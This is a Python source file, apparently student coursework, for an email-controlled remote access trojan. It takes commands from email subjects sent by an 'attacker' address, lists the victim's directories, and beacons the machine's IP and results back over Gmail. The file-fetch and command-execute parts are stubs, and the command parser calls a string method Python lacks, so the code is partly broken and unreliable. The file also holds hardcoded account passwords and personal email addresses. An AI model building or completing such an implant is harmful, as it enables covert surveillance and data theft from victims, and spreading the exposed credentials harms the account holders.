import os
import smtplib
import imaplib
import email
import time
import socket
import ssl

#Dropbox: william.chen@stonybrook.edu
#Password: cse363esc
emailAdr = "os.services.updates@gmail.com"
password = "cse363esc"
SMTP_SERVER = "imap.gmail.com"
#attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
attacker_email = "William Chen <william.chen@stonybrook.edu>"
SMTP_PORT = 993
commands = []

#SEND EMAIL
def sendEmail(msg):
    port = 465  # For SSL

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(emailAdr, password)
        server.sendmail(emailAdr, attacker_email, msg)

#EMAIL SUBJECT = show [Directory path]
#NEEDS TO START WITH "C:/" UNLESS KNOWN PATH
def showFiles(com):
    dirList = []
    fileList = []
    splitCom = com.split(" ")
    del(splitCom[0])
    actualPath = splitCom[0]
    for x in os.listdir(actualPath):
        if os.path.isdir(os.path.join(actualPath, x)):
            dirList.append(x)
        elif os.path.isfile(os.path.join(actualPath, x)):
            fileList.append(x)

    #SEND EMAIL WITH DIRLIST AND FILELIST
    directories_string = ""
    for dir in dirList:
        directories_string += dir + "\n"
    files_string = ""
    for file in fileList:
        files_string += file + "\n"
    payload = "Files:\n" + files_string + "\nDirectories:\n" + directories_string
    print(payload)
    sendEmail(payload)

#EMAIL SUBJECT = fetch [file name]
def getFile(com):
    splitCom = com.split(" ")
    del(splitCom[0])
    filePath = splitCom[0]
    #EMAIL FILEPATH

#EMAIL SUBJECT = execute [command]
def executeCom(com):
    splitCom = com.split(" ")
    del(splitCom[0])
    execCom = splitCom[0]

def commandParser(coms):
     while coms:
        command = coms[0]
        if command.contains("show"):
            showFiles(coms[0])
        elif command.contains("fetch"):
            getFile(coms[0])
        elif command.contains("execute"):
            executeCom(coms[0])
        del coms[0]

def readEmail():
    mail = imaplib.IMAP4_SSL(SMTP_SERVER)
    mail.login(emailAdr, password)
    mail.select('inbox')

    typ, data = mail.search(None, 'ALL')  
    for i in data[0].split():
        typ, data = mail.fetch(i, '(RFC822)' )
        msg = email.message_from_bytes(data[0][1])
        subject = msg['Subject']
        sender = msg['From']
        if(sender == attacker_email):
            commands.append(subject)    
            print ('From : ' + sender + '\n')
            print ('Subject : ' + subject + '\n')
    
    if commands:
       commandParser(commands) 

    mail.expunge()


def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    IPaddr = s.getsockname()[0]
    s.close()
    return IPaddr

def periodicUpdates(seconds):
    startTime=time.time()
    while True:
        readEmail()
        message = "Subject: " + str(getIP()) + "\n\n" + "Checkin in boss"
        sendEmail(message)
        time.sleep(seconds - ((time.time() - startTime) % seconds))

#readEmail()
showFiles("show C:/")
#periodicUpdates(60.0)

#Directories - show [Directory name]
#Files - fetch [Absolute file path]
#Commands - execute [commands]
#Download - 
